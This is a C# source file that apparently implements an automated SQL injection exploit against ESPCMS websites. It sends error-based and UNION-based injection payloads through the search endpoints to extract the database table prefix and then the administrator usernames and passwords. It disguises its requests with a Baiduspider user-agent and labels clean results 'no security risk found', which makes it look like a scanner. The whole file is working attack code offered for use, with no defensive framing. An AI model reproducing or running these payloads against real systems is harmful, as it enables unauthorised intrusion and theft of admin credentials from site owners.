using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class espcms
	{
		public string exp(string url)
		{
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			string wapzhurus = this.wapzhuru(urls);
			if (wapzhurus != "网站未发现安全隐患" && !wapzhurus.Contains("UBLIC"))
			{
				return wapzhurus;
			}
			string zhurujieguo = this.exps(urls);
			if (zhurujieguo.Length >= 7)
			{
				return zhurujieguo;
			}
			if (zhurujieguo == "++")
			{
				zhurujieguo = "网站未发现安全隐患";
			}
			return zhurujieguo;
		}
		public string exps(string url)
		{
			string urls = url;
			string exp = "/index.php?ac=search&at=taglist&tagkey=%2527,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,table_name,0x27,0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23";
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			WebClient cli = new WebClient();
			cli.Headers.Add("user-agent", "Baiduspider");
			cli.Encoding = Encoding.Default;
			string shuju = cli.DownloadString(urls + exp);
			string qianzhui = "";
			if (shuju.Contains("Duplicate entry '~'"))
			{
				try
				{
					string shujus = shuju.Substring(shuju.IndexOf("Duplicate entry '~'") + 19, 30);
					qianzhui = shujus.Substring(0, shujus.IndexOf("_"));
				}
				catch
				{
					string result = "";
					return result;
				}
			}
			string exp2 = "/index.php?ac=search&at=taglist&tagkey=%2527,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,username,0x27,0x7e)) from " + qianzhui + "_admin_member limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23";
			string exp3 = "/index.php?ac=search&at=taglist&tagkey=%2527,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,password,0x27,0x7e)) from " + qianzhui + "_admin_member limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23";
			string name = "";
			string password = "";
			if (qianzhui != "")
			{
				string shujuname = cli.DownloadString(urls + exp2);
				if (shujuname.Contains("Duplicate entry '~'"))
				{
					try
					{
						string shujus2 = shujuname.Substring(shuju.IndexOf("Duplicate entry '~'") + 19, 30);
						name = shujus2.Substring(0, shujus2.IndexOf("'"));
					}
					catch
					{
						string result = "";
						return result;
					}
				}
				string shujupassword = cli.DownloadString(urls + exp3);
				if (shujupassword.Contains("Duplicate entry '~'"))
				{
					try
					{
						string shujus3 = shujupassword.Substring(shuju.IndexOf("Duplicate entry '~'") + 19, 35);
						password = shujus3.Substring(0, shujus3.IndexOf("'"));
					}
					catch
					{
						string result = "";
						return result;
					}
				}
			}
			return name + "++" + password;
		}
		public string wapzhuru(string url)
		{
			string result;
			try
			{
				string EXP = "/wap/index.php?ac=search&at=result&lng=cn&mid=3&tid=11&keyword=1&keyname=a.title&countnum=1&attr[jobnum]=1%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28username,CHAR%2838%29,password%29,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45%20from%20espcms_admin_member;%23";
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string scrString = new WebClient
				{
					Headers = 
					{

						{
							"user-agent",
							"Baiduspider"
						}
					},
					Encoding = Encoding.Default
				}.DownloadString(urls + EXP);
				int kaishi = scrString.IndexOf("infolist");
				string shuju = scrString.Substring(kaishi + 17, 50);
				string jieguo = shuju.Substring(0, shuju.IndexOf("\""));
				result = jieguo;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
